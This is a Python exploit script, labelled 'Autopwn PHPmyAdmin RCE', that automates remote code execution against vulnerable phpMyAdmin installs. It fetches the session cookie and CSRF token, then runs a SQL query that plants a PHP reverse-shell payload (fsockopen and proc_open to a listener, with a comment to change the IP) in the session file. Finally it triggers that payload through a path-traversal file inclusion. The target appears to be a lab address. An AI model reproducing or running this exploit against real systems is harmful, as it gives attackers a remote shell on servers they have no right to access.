#!/usr/bin/env python3
# Author: @trustie_rity

import requests
import re
import time

def get_cookie(session, url):
    response = session.get(url)
    cookies = session.cookies.get_dict()
    pma_cookie = cookies.get("phpMyAdmin", "")
    print(f"The cookie is: {pma_cookie}")
    return pma_cookie

def get_token(session, url):
    response = session.get(url)
    token_match = re.search(r"name=\"token\" value=\"(.*?)\"", response.text)
    print(token_match)
    if token_match:
        print(token_match.group(1))
        return token_match.group(1)
    else:
        raise Exception("Token not found")

def execute_payload(session, url, cookie, token):
    payload = {
        "is_js_confirmed": "0",
        "token": token,
        "pos": "0",
        "goto": "server_sql.php",
        "message_to_show": "Your SQL query has been executed successfully.",
        "prev_sql_query": "",
        "sql_query": "SELECT '<?php $sock=fsockopen(\"127.0.0.1\",4444);$proc=proc_open(\"sh\", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);?>'", # change the IP address  
        "sql_delimiter": ";",
        "show_query": "1",
        "fk_checks": ["0", "1"],
        "SQL": "Go",
        "ajax_request": "true",
        "ajax_page_request": "true",
        "_nocache": str(int(time.time() * 1000)),
        "token": token
    }
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Origin": "http://192.168.125.10:8080",
        "Cookie": f"phpMyAdmin={cookie}; pma_lang=en"
    }
    response = session.post(url, headers=headers, data=payload)
    return response

def trigger_shell(session, url, cookie):
    exploit_url = f"{url}/index.php?target=db_sql.php%253f/../../../../../../../../tmp/sess_{cookie}"
    response = session.get(exploit_url)
    print("Shell triggered.")

def main():
    target_url = "http://192.168.125.10:8080"
    session = requests.Session()
    
    print("Autopwn PHPmyAdmin RCE")
    time.sleep(1)

    cookie = get_cookie(session, target_url)
    time.sleep(1)

    token = get_token(session, f"{target_url}/import.php")
    print(f"Retrieved token: {token}")
    time.sleep(1)

    print("Executing payload...")
    execute_payload(session, f"{target_url}/import.php", cookie, token)
    time.sleep(1)

    print("Triggering reverse shell...")
    trigger_shell(session, target_url, cookie)
    time.sleep(1)

if __name__ == "__main__":
    main()

